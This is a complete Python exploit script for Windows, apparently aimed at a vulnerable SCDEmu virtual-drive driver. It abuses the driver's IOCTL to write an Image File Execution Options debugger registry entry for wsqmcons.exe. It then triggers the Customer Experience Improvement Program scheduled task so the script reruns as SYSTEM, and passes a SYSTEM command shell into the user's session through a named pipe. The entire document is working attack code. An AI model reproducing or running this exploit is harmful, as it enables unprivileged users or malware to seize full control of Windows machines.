#!/usr/bin/env python3
import sys, io, struct, threading, subprocess

import win32api, win32con
import win32file
import win32pipe
import win32security
import win32process
from win32com.shell.shell import IsUserAnAdmin

def launch_pipe():
    server_pipe = \
        win32pipe.CreateNamedPipe(r'\\.\pipe\scdemu-sys-exploit', win32pipe.PIPE_ACCESS_OUTBOUND, win32pipe.PIPE_WAIT, 1, 0x1000, 0x1000, win32pipe.NMPWAIT_WAIT_FOREVER, None)

    try:
        win32pipe.ConnectNamedPipe(server_pipe, None)
    finally:
        win32file.CloseHandle(server_pipe)

if IsUserAnAdmin(): # when we get `nt authority\system`
    client_pipe = \
        win32file.CreateFile(r'\\.\pipe\scdemu-sys-exploit', win32file.GENERIC_READ, 0, None, win32file.OPEN_EXISTING, 0, None)
    try:
        session_id = win32pipe.GetNamedPipeServerSessionId(client_pipe)

        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
        token2 = win32security.DuplicateTokenEx(token, win32security.SecurityIdentification, win32con.MAXIMUM_ALLOWED, win32security.TokenPrimary, None)

        win32security.SetTokenInformation(token2, win32security.TokenSessionId, session_id)

        hProcess, hThread, _, _ = \
            win32process.CreateProcessAsUser(token2, None, 'cmd.exe', None, None, False, win32process.CREATE_NEW_CONSOLE, None, None, win32process.STARTUPINFO())

        win32file.CloseHandle(hThread)
        win32file.CloseHandle(hProcess)
    finally:
        win32file.CloseHandle(client_pipe)
else:
    t = threading.Thread(target = launch_pipe)
    t.start()

    scd_dev = win32file.CreateFile(r'\\.\SCDEmuDev0', win32file.GENERIC_READ, 0, None, win32file.OPEN_EXISTING, 0, None)
    try:
        with io.BytesIO() as buf:
            buf.write(r'\Registry\Machine\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wsqmcons.exe'.encode('utf-16-le') + b'\x00\x00')
            buf.write(r'Debugger'.encode('utf-16-le') + b'\x00\x00')

            s = subprocess.list2cmdline([ sys.executable, __file__ ]).encode('utf-16-le') + b'\x00\x00'

            buf.write(struct.pack('<II', win32con.REG_SZ, len(s)))
            buf.write(s)

            win32file.DeviceIoControl(scd_dev, 0x80002018, buf.getvalue(), 0, None)
    finally:
        win32file.CloseHandle(scd_dev)

    # trigger Task Scheduler run wsqmcons.exe
    subprocess.call(['schtasks', '/run', '/TN', '\Microsoft\Windows\Customer Experience Improvement Program\Consolidator'])
